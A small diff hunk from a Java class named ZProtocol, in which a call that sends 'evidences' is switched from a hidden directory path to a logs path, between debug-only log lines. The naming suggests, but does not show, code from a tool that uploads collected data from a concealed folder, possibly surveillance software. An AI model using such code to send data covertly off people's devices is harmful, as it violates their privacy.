@@ -181,7 +181,7 @@ public class ZProtocol extends Protocol {
             debug.info("***** Log *****");
             //#endif  
 
-            sendEvidences(Path.hidden());
+            sendEvidences(Path.logs());
 
             //#ifdef DEBUG
             debug.info("***** END *****");
